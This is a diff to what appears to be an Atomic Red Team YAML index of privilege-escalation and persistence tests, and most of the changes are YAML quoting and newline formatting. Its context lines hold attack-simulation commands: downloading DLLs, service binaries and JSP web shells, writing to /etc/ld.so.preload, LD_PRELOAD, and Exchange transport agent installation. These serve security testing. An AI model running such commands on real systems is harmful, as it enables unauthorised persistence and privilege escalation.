@@ -535,19 +535,27 @@ privilege-escalation:
       dependency_executor_name: powershell
       dependencies:
       - description: 'Reg files must exist on disk at specified locations (#{registry_file}
-          and #{registry_cleanup_file})'
+          and #{registry_cleanup_file})
+
+'
         prereq_command: 'if ((Test-Path #{registry_file}) -and (Test-Path #{registry_cleanup_file}))
-          {exit 0} else {exit 1}'
-        get_prereq_command: |-
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           New-Item -Type Directory (split-path #{registry_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg" -OutFile "#{registry_file}"
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg" -OutFile "#{registry_cleanup_file}"
-      - description: DLL's must exist in the C:\Tools directory (T1546.010.dll and
+      - description: 'DLL''s must exist in the C:\Tools directory (T1546.010.dll and
           T1546.010x86.dll)
-        prereq_command: if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
+
+'
+        prereq_command: 'if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
           {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           New-Item -Type Directory C:\Tools -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll" -OutFile C:\Tools\T1546.010.dll
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll" -OutFile C:\Tools\T1546.010x86.dll
@@ -660,16 +668,25 @@ privilege-escalation:
           default: PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb
       dependency_executor_name: powershell
       dependencies:
-      - description: Shim database file must exist on disk at specified location (#{file_path})
-        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Shim database file must exist on disk at specified location
+          (#{file_path})
+
+'
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
-      - description: AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
-        prereq_command: if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit
+      - description: 'AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
+
+'
+        prereq_command: 'if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit
           1}
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
       executor:
@@ -889,14 +906,26 @@ privilege-escalation:
           default: echo Hello from Atomic Red Team
       dependency_executor_name: sh
       dependencies:
-      - description: The `at` and `atd` executables must exist in the PATH
-        prereq_command: which at && which atd
+      - description: 'The `at` and `atd` executables must exist in the PATH
+
+'
+        prereq_command: 'which at && which atd
+
+'
         get_prereq_command: 'echo ''Please install `at` and `atd`; they were not found
-          in the PATH (Package name: `at`)'''
-      - description: The `atd` daemon must be running
-        prereq_command: systemctl status atd || service atd status
+          in the PATH (Package name: `at`)''
+
+'
+      - description: 'The `atd` daemon must be running
+
+'
+        prereq_command: 'systemctl status atd || service atd status
+
+'
         get_prereq_command: 'echo ''Please start the `atd` daemon (sysv: `service
-          atd start` ; systemd: `systemctl start atd`)'''
+          atd start` ; systemd: `systemctl start atd`)''
+
+'
       executor:
         name: sh
         elevation_required: false
@@ -1771,9 +1800,11 @@ privilege-escalation:
           default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
       dependency_executor_name: powershell
       dependencies:
-      - description: "#{file_name} must be present"
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: "#{file_name} must be present\n"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
@@ -1812,9 +1843,11 @@ privilege-escalation:
           default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
       dependency_executor_name: powershell
       dependencies:
-      - description: "#{file_name} must be present"
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: "#{file_name} must be present\n"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
@@ -1849,9 +1882,11 @@ privilege-escalation:
           default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
       dependency_executor_name: powershell
       dependencies:
-      - description: "#{file_name} must be present"
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: "#{file_name} must be present\n"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
@@ -2249,9 +2284,13 @@ privilege-escalation:
           default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
-        prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Gup.exe binary must exist on disk at specified location (#{gup_executable})
+
+'
+        prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
       executor:
@@ -3353,9 +3392,13 @@ privilege-escalation:
           default: PathToAtomicsFolder/T1547.006/src
       dependency_executor_name: bash
       dependencies:
-      - description: The kernel module must exist on disk at specified location
-        prereq_command: 'if [ -f #{module_path} ]; then exit 0; else exit 1; fi;'
-        get_prereq_command: |-
+      - description: 'The kernel module must exist on disk at specified location
+
+'
+        prereq_command: 'if [ -f #{module_path} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: |
           if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
           cp #{module_source_path}/* #{temp_folder}/
           cd #{temp_folder}; make
@@ -3498,10 +3541,17 @@ privilege-escalation:
           default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_to_shared_library})
+
+'
         prereq_command: 'if [ -f #{path_to_shared_library ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}'
+          1; fi;
+
+'
+        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+
+'
       executor:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
@@ -3530,10 +3580,17 @@ privilege-escalation:
           default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_to_shared_library})
+
+'
         prereq_command: 'if [ -f #{path_to_shared_library} ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}'
+          1; fi;
+
+'
+        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+
+'
       executor:
         command: 'LD_PRELOAD=#{path_to_shared_library} ls
 
@@ -3702,11 +3759,18 @@ privilege-escalation:
           default: "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_malicious_plist})
+
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: echo "The shared library doesn't exist. Check the path";
+          1; fi;
+
+'
+        get_prereq_command: 'echo "The shared library doesn''t exist. Check the path";
           exit 1;
+
+'
       executor:
         name: bash
         elevation_required: true
@@ -3803,11 +3867,18 @@ privilege-escalation:
           default: "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_malicious_plist})
+
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: echo "The plist file doesn't exist. Check the path and
+          1; fi;
+
+'
+        get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
+
+'
       executor:
         name: bash
         elevation_required: true
@@ -4372,9 +4443,13 @@ privilege-escalation:
           default: iexplore
       dependency_executor_name: powershell
       dependencies:
-      - description: DLL to inject must exist on disk at specified location (#{dll_path})
-        prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'DLL to inject must exist on disk at specified location (#{dll_path})
+
+'
+        prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
       executor:
@@ -5031,9 +5106,15 @@ privilege-escalation:
           default: "$profile"
       dependency_executor_name: powershell
       dependencies:
-      - description: Ensure a powershell profile exists for the current user
-        prereq_command: 'if (Test-Path #{ps_profile}) {exit 0} else {exit 1}'
-        get_prereq_command: 'New-Item -Path #{ps_profile} -Type File -Force'
+      - description: 'Ensure a powershell profile exists for the current user
+
+'
+        prereq_command: 'if (Test-Path #{ps_profile}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'New-Item -Path #{ps_profile} -Type File -Force
+
+'
       executor:
         command: |
           Add-Content #{ps_profile} -Value ""
@@ -5441,9 +5522,13 @@ privilege-escalation:
           default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: Utility to inject must exist on disk at specified location (#{dll_payload})
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
       executor:
@@ -6452,16 +6537,24 @@ privilege-escalation:
           default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
-      - description: A file must exist on disk at specified location (#{weak_permission_file})
+      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
+
+'
         prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}'
-        get_prereq_command: |-
+          1}
+
+'
+        get_prereq_command: |
           New-Item #{weak_permission_file} -Force | Out-Null
           Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: A file to replace the original weak_permission_file. In an attack
+      - description: 'A file to replace the original weak_permission_file. In an attack
           this would be the malicious file gaining extra privileges
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
@@ -7855,9 +7948,13 @@ privilege-escalation:
           default: AtomicTestService_CMD
       dependency_executor_name: powershell
       dependencies:
-      - description: Service binary must exist on disk at specified location (#{binary_path})
-        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Service binary must exist on disk at specified location (#{binary_path})
+
+'
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
@@ -7887,9 +7984,13 @@ privilege-escalation:
           default: AtomicTestService_PowerShell
       dependency_executor_name: powershell
       dependencies:
-      - description: Service binary must exist on disk at specified location (#{binary_path})
-        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Service binary must exist on disk at specified location (#{binary_path})
+
+'
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
@@ -8688,19 +8789,27 @@ persistence:
       dependency_executor_name: powershell
       dependencies:
       - description: 'Reg files must exist on disk at specified locations (#{registry_file}
-          and #{registry_cleanup_file})'
+          and #{registry_cleanup_file})
+
+'
         prereq_command: 'if ((Test-Path #{registry_file}) -and (Test-Path #{registry_cleanup_file}))
-          {exit 0} else {exit 1}'
-        get_prereq_command: |-
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           New-Item -Type Directory (split-path #{registry_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg" -OutFile "#{registry_file}"
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg" -OutFile "#{registry_cleanup_file}"
-      - description: DLL's must exist in the C:\Tools directory (T1546.010.dll and
+      - description: 'DLL''s must exist in the C:\Tools directory (T1546.010.dll and
           T1546.010x86.dll)
-        prereq_command: if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
+
+'
+        prereq_command: 'if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
           {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           New-Item -Type Directory C:\Tools -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll" -OutFile C:\Tools\T1546.010.dll
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll" -OutFile C:\Tools\T1546.010x86.dll
@@ -8813,16 +8922,25 @@ persistence:
           default: PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb
       dependency_executor_name: powershell
       dependencies:
-      - description: Shim database file must exist on disk at specified location (#{file_path})
-        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Shim database file must exist on disk at specified location
+          (#{file_path})
+
+'
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
-      - description: AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
-        prereq_command: if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit
+      - description: 'AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
+
+'
+        prereq_command: 'if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit
           1}
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
       executor:
@@ -8937,14 +9055,26 @@ persistence:
           default: echo Hello from Atomic Red Team
       dependency_executor_name: sh
       dependencies:
-      - description: The `at` and `atd` executables must exist in the PATH
-        prereq_command: which at && which atd
+      - description: 'The `at` and `atd` executables must exist in the PATH
+
+'
+        prereq_command: 'which at && which atd
+
+'
         get_prereq_command: 'echo ''Please install `at` and `atd`; they were not found
-          in the PATH (Package name: `at`)'''
-      - description: The `atd` daemon must be running
-        prereq_command: systemctl status atd || service atd status
+          in the PATH (Package name: `at`)''
+
+'
+      - description: 'The `atd` daemon must be running
+
+'
+        prereq_command: 'systemctl status atd || service atd status
+
+'
         get_prereq_command: 'echo ''Please start the `atd` daemon (sysv: `service
-          atd start` ; systemd: `systemctl start atd`)'''
+          atd start` ; systemd: `systemctl start atd`)''
+
+'
       executor:
         name: sh
         elevation_required: false
@@ -10057,9 +10187,11 @@ persistence:
           default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
       dependency_executor_name: powershell
       dependencies:
-      - description: "#{file_name} must be present"
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: "#{file_name} must be present\n"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
@@ -10098,9 +10230,11 @@ persistence:
           default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
       dependency_executor_name: powershell
       dependencies:
-      - description: "#{file_name} must be present"
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: "#{file_name} must be present\n"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
@@ -10135,9 +10269,11 @@ persistence:
           default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
       dependency_executor_name: powershell
       dependencies:
-      - description: "#{file_name} must be present"
-        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: "#{file_name} must be present\n"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
@@ -10578,9 +10714,13 @@ persistence:
           default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
-        prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Gup.exe binary must exist on disk at specified location (#{gup_executable})
+
+'
+        prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
       executor:
@@ -11547,9 +11687,13 @@ persistence:
           default: PathToAtomicsFolder/T1547.006/src
       dependency_executor_name: bash
       dependencies:
-      - description: The kernel module must exist on disk at specified location
-        prereq_command: 'if [ -f #{module_path} ]; then exit 0; else exit 1; fi;'
-        get_prereq_command: |-
+      - description: 'The kernel module must exist on disk at specified location
+
+'
+        prereq_command: 'if [ -f #{module_path} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: |
           if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
           cp #{module_source_path}/* #{temp_folder}/
           cd #{temp_folder}; make
@@ -11692,10 +11836,17 @@ persistence:
           default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_to_shared_library})
+
+'
         prereq_command: 'if [ -f #{path_to_shared_library ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}'
+          1; fi;
+
+'
+        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+
+'
       executor:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
@@ -11724,10 +11875,17 @@ persistence:
           default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_to_shared_library})
+
+'
         prereq_command: 'if [ -f #{path_to_shared_library} ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}'
+          1; fi;
+
+'
+        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+
+'
       executor:
         command: 'LD_PRELOAD=#{path_to_shared_library} ls
 
@@ -11896,11 +12054,18 @@ persistence:
           default: "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_malicious_plist})
+
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: echo "The shared library doesn't exist. Check the path";
+          1; fi;
+
+'
+        get_prereq_command: 'echo "The shared library doesn''t exist. Check the path";
           exit 1;
+
+'
       executor:
         name: bash
         elevation_required: true
@@ -11997,11 +12162,18 @@ persistence:
           default: "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_malicious_plist})
+
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: echo "The plist file doesn't exist. Check the path and
+          1; fi;
+
+'
+        get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
+
+'
       executor:
         name: bash
         elevation_required: true
@@ -13605,9 +13777,15 @@ persistence:
           default: "$profile"
       dependency_executor_name: powershell
       dependencies:
-      - description: Ensure a powershell profile exists for the current user
-        prereq_command: 'if (Test-Path #{ps_profile}) {exit 0} else {exit 1}'
-        get_prereq_command: 'New-Item -Path #{ps_profile} -Type File -Force'
+      - description: 'Ensure a powershell profile exists for the current user
+
+'
+        prereq_command: 'if (Test-Path #{ps_profile}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'New-Item -Path #{ps_profile} -Type File -Force
+
+'
       executor:
         command: |
           Add-Content #{ps_profile} -Value ""
@@ -14782,16 +14960,24 @@ persistence:
           default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
-      - description: A file must exist on disk at specified location (#{weak_permission_file})
+      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
+
+'
         prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}'
-        get_prereq_command: |-
+          1}
+
+'
+        get_prereq_command: |
           New-Item #{weak_permission_file} -Force | Out-Null
           Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: A file to replace the original weak_permission_file. In an attack
+      - description: 'A file to replace the original weak_permission_file. In an attack
           this would be the malicious file gaining extra privileges
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
@@ -15524,9 +15710,15 @@ persistence:
           type: string
           default: Security Interop Agent
       dependencies:
-      - description: Microsoft Exchange SnapIn must be installed
-        prereq_command: Get-TransportAgent -TransportService FrontEnd
-        get_prereq_command: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+      - description: 'Microsoft Exchange SnapIn must be installed
+
+'
+        prereq_command: 'Get-TransportAgent -TransportService FrontEnd
+
+'
+        get_prereq_command: 'Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+
+'
       executor:
         command: |
           Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}
@@ -15763,9 +15955,13 @@ persistence:
           default: PathToAtomicsFolder\T1505.003\src\
       dependency_executor_name: powershell
       dependencies:
-      - description: Web shell must exist on disk at specified location (#{web_shells})
-        prereq_command: 'if (Test-Path #{web_shells}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Web shell must exist on disk at specified location (#{web_shells})
+
+'
+        prereq_command: 'if (Test-Path #{web_shells}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
@@ -16025,9 +16221,13 @@ persistence:
           default: AtomicTestService_CMD
       dependency_executor_name: powershell
       dependencies:
-      - description: Service binary must exist on disk at specified location (#{binary_path})
-        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Service binary must exist on disk at specified location (#{binary_path})
+
+'
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
@@ -16057,9 +16257,13 @@ persistence:
           default: AtomicTestService_PowerShell
       dependency_executor_name: powershell
       dependencies:
-      - description: Service binary must exist on disk at specified location (#{binary_path})
-        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Service binary must exist on disk at specified location (#{binary_path})
+
+'
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
@@ -16609,9 +16813,13 @@ credential-access:
           default: https://www.example.com
       dependency_executor_name: powershell
       dependencies:
